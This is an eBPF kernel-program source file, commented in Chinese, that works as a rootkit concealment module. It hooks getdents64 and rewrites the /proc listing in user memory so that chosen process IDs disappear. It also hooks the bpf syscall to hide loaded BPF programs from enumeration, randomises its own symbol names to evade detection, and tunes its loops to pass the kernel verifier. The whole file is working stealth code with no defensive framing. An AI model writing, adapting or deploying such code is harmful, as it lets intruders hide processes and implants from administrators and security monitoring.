// /proc 进程与 BPF 程序枚举隐藏 (名字随机化)
//   - tracepoint getdents64 (exit): 从 /proc 目录列表剔除 hidden_pids 中的 PID。
//     内核 verifier 对单程序有 ~8192 跳复杂度上限, 一条有状态循环扫不完整个
//     /proc, 采用"双程序尾调用接力": sx_ 处理前 64 条后 tail_call 到 sy_,
//     sy_ 处理 64 条再 tail_call 回 sx_, 每个程序独立吃满自己的预算。
//   - kprobe/kretprobe __x64_sys_bpf: 从 BPF_PROG_GET_NEXT_ID 枚举中剔除 hidden_progs
//     (部分内核拒绝 kretprobe 写返回值, 加载失败自动跳过)。
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <linux/ptrace.h>

#ifndef PM_TOKEN
#define PM_TOKEN defaul
#endif

#define PM_CAT2(a, b) a##b
#define PM_CAT(a, b) PM_CAT2(a, b)
#define PM_STR2(x) #x
#define PM_STR(x) PM_STR2(x)

#define PM_HIDDEN_PIDS   PM_CAT(hp_, PM_TOKEN)
#define PM_HIDDEN_PROGS  PM_CAT(hg_, PM_TOKEN)
#define PM_DIR_BUFS      PM_CAT(db_, PM_TOKEN)
#define PM_PROG_STATE    PM_CAT(pg_, PM_TOKEN)
#define PM_TAILS         PM_CAT(pt_, PM_TOKEN)
#define PM_STATE         PM_CAT(st_, PM_TOKEN)
#define PM_SEC_ENTER     PM_STR(PM_CAT(st_en_, PM_TOKEN))
#define PM_SEC_EXIT      PM_STR(PM_CAT(st_ex_, PM_TOKEN))
#define PM_SEC_KP_ENTER  PM_STR(PM_CAT(sk_en_, PM_TOKEN))
#define PM_SEC_KP_EXIT   PM_STR(PM_CAT(sk_ex_, PM_TOKEN))
#define PM_FN_ENTER      PM_CAT(se_, PM_TOKEN)
#define PM_FN_EXIT       PM_CAT(sx_, PM_TOKEN)
#define PM_FN_EXIT2      PM_CAT(sy_, PM_TOKEN)
#define PM_FN_KP_ENTER   PM_CAT(ke_, PM_TOKEN)
#define PM_FN_KP_EXIT    PM_CAT(kx_, PM_TOKEN)

#define MAX_HIDDEN 4
#define CHUNK 64
#define BPF_PROG_GET_NEXT_ID 11

struct trace_enter {
    unsigned short common_type;
    unsigned char common_flags;
    unsigned char common_preempt_count;
    int common_pid;
    int __syscall_nr;
    long args[6];
};

struct trace_exit {
    unsigned short common_type;
    unsigned char common_flags;
    unsigned char common_preempt_count;
    int common_pid;
    int __syscall_nr;
    long ret;
};

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_HIDDEN);
    __type(key, __u32);
    __type(value, __u32);
} PM_HIDDEN_PIDS SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_HIDDEN);
    __type(key, __u32);
    __type(value, __u32);
} PM_HIDDEN_PROGS SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u64);
    __type(value, void *);
} PM_DIR_BUFS SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u64);
} PM_PROG_STATE SEC(".maps");

struct PM_CAT(hide_state_, PM_TOKEN) {
    char *pos;
    char *end;
    char *prev;
    unsigned short prev_reclen;
    __u32 hids[MAX_HIDDEN];
};

// 尾调用跳板 (0 → sx_ 即自身回跳, 1 → sy_)
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 2);
    __type(key, __u32);
    __type(value, __u32);
} PM_TAILS SEC(".maps");

// 接力迭代状态 — 按线程 (tid) 哈希隔离:
// 多个线程并发 getdents64 时各自持有独立状态, 避免互相覆盖导致
// 误改他人目录缓冲 (曾导致同机 node 进程 readdir 崩溃)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u64);
    __type(value, struct PM_CAT(hide_state_, PM_TOKEN));
} PM_STATE SEC(".maps");

// 固定大小视图: 通过 bpf_probe_read_user 读取 (tracepoint 里不能直接解引用用户内存)
#define PM_DIRENT_MAX_NAME 32
struct linux_dirent64_view {
    __u64        d_ino;
    __s64        d_off;
    unsigned short d_reclen;
    unsigned char  d_type;
    char           d_name[PM_DIRENT_MAX_NAME];
};

// 手工展开 (老内核 5.15 verifier 对含 helper 调用的循环判 "infinite loop")
static __always_inline int is_hidden_prog(__u32 id) {
    __u32 i;
    __u32 *p;
    i = 0; p = bpf_map_lookup_elem(&PM_HIDDEN_PROGS, &i);
    if (p && *p != 0 && *p == id) return 1;
    i = 1; p = bpf_map_lookup_elem(&PM_HIDDEN_PROGS, &i);
    if (p && *p != 0 && *p == id) return 1;
    i = 2; p = bpf_map_lookup_elem(&PM_HIDDEN_PROGS, &i);
    if (p && *p != 0 && *p == id) return 1;
    i = 3; p = bpf_map_lookup_elem(&PM_HIDDEN_PROGS, &i);
    if (p && *p != 0 && *p == id) return 1;
    return 0;
}

// 无循环的 7 位十进制 pid 解析 (控制 verifier 状态数)
static __always_inline int pid_from_name(char *name) {
    int pid = 0;
#pragma unroll
    for (int i = 0; i < 8; i++) {
        char c = name[i];
        if (c == 0)
            return pid;
        if (c < '0' || c > '9')
            return 0;
        pid = pid * 10 + (c - '0');
    }
    return 0;
}

// kprobe 挂在 __x64_sys_getdents64 (getdents64(fd, dirent, count)):
// 比 syscalls tracepoint 在定制内核上更可靠
SEC("tracepoint/syscalls/sys_enter_getdents64")
int PM_FN_ENTER(struct trace_enter *ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    void *buf = (void *)ctx->args[1];
    bpf_map_update_elem(&PM_DIR_BUFS, &pid_tgid, &buf, BPF_ANY);
    return 0;
}

// 处理至多 chunk 条 dirent; 返回 0=还有剩余, 1=完成/异常
// 注: 6.x 内核接受该有界循环; 5.15 老 verifier 会判 "infinite loop"
// (状态不收敛), 此时程序加载失败由 LoadStealth 宽容跳过
static __always_inline int process_chunk(struct PM_CAT(hide_state_, PM_TOKEN) *hc) {
    for (int i = 0; i < CHUNK; i++) {
        if (hc->pos >= hc->end)
            return 1;
        struct linux_dirent64_view de = {};
        // 定长读取: 变长 probe_read 会让 verifier 对每个尺寸边界展开状态;
        // 用户缓冲在 ret 之后仍有富余 (调用方分配的整块缓冲), 安全。
        if (bpf_probe_read_user(&de, sizeof(de), hc->pos) < 0)
            return 1;
        if (de.d_reclen == 0 || de.d_reclen < 16)
            return 1;
        int pid = pid_from_name(de.d_name);
        if (pid > 0 &&
            (hc->hids[0] == (__u32)pid || hc->hids[1] == (__u32)pid ||
             hc->hids[2] == (__u32)pid || hc->hids[3] == (__u32)pid)) {
            if (hc->prev && hc->prev_reclen > 0) {
                unsigned short merged = hc->prev_reclen + de.d_reclen;
                // 前一条目 reclen 吞并被隐藏条目 (getdents64 输出即被剔除)
                bpf_probe_write_user(hc->prev + 16, &merged, sizeof(merged));
            }
        } else {
            hc->prev = hc->pos;
            hc->prev_reclen = de.d_reclen;
        }
        hc->pos += de.d_reclen;
    }
    return 0;
}

SEC("tracepoint/syscalls/sys_exit_getdents64")
int PM_FN_EXIT(struct trace_exit *ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    void **bufp = bpf_map_lookup_elem(&PM_DIR_BUFS, &pid_tgid);
    if (!bufp || !*bufp) return 0;
    void *buf = *bufp;
    bpf_map_delete_elem(&PM_DIR_BUFS, &pid_tgid);

    int ret = (int)ctx->ret;
    if (ret <= 0) return 0;

    struct PM_CAT(hide_state_, PM_TOKEN) hc = {};
    hc.pos = (char *)buf;
    hc.end = (char *)buf + ret;
    // 手工展开 (同 is_hidden_prog, 兼容老内核 verifier)
    {
        __u32 j;
        __u32 *p;
        j = 0; p = bpf_map_lookup_elem(&PM_HIDDEN_PIDS, &j);
        if (p) hc.hids[0] = *p;
        j = 1; p = bpf_map_lookup_elem(&PM_HIDDEN_PIDS, &j);
        if (p) hc.hids[1] = *p;
        j = 2; p = bpf_map_lookup_elem(&PM_HIDDEN_PIDS, &j);
        if (p) hc.hids[2] = *p;
        j = 3; p = bpf_map_lookup_elem(&PM_HIDDEN_PIDS, &j);
        if (p) hc.hids[3] = *p;
    }
    if (process_chunk(&hc) == 0) {
        bpf_map_update_elem(&PM_STATE, &pid_tgid, &hc, BPF_ANY);
        bpf_tail_call(ctx, &PM_TAILS, 1);
    } else {
        bpf_map_delete_elem(&PM_STATE, &pid_tgid);
    }
    return 0;
}

// 接力程序: 与 sx_ 交替处理后续条目 (各自独立占用 verifier 复杂度预算)
SEC("tracepoint/syscalls/sys_exit_getdents64")
int PM_FN_EXIT2(struct trace_exit *ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    struct PM_CAT(hide_state_, PM_TOKEN) *s = bpf_map_lookup_elem(&PM_STATE, &pid_tgid);
    if (!s || s->pos == 0 || s->end == 0)
        return 0;
    struct PM_CAT(hide_state_, PM_TOKEN) hc = *s;
    if (process_chunk(&hc) == 0) {
        bpf_map_update_elem(&PM_STATE, &pid_tgid, &hc, BPF_ANY);
        bpf_tail_call(ctx, &PM_TAILS, 0);
    } else {
        bpf_map_delete_elem(&PM_STATE, &pid_tgid);
    }
    return 0;
}

SEC("kprobe/__x64_sys_bpf")
int PM_FN_KP_ENTER(struct pt_regs *ctx) {
    int cmd = (int)PT_REGS_PARM1(ctx);
    if (cmd != BPF_PROG_GET_NEXT_ID) return 0;

    __u32 start_id = (__u32)PT_REGS_PARM2(ctx);
    __u64 state = ((__u64)start_id << 32) | 1;
    __u32 key = 0;
    bpf_map_update_elem(&PM_PROG_STATE, &key, &state, BPF_ANY);
    return 0;
}

SEC("kretprobe/__x64_sys_bpf")
int PM_FN_KP_EXIT(struct pt_regs *ctx) {
    __u32 key = 0;
    __u64 *statep = bpf_map_lookup_elem(&PM_PROG_STATE, &key);
    if (!statep) return 0;
    __u64 state = *statep;
    if ((state & 1) == 0) return 0;

    int ret = (int)PT_REGS_RC(ctx);
    if (ret <= 0) return 0;

    __u32 next_id = (__u32)ret;
    if (is_hidden_prog(next_id))
        PT_REGS_RC(ctx) = -2;

    bpf_map_delete_elem(&PM_PROG_STATE, &key);
    return 0;
}

char _license[] SEC("license") = "GPL";
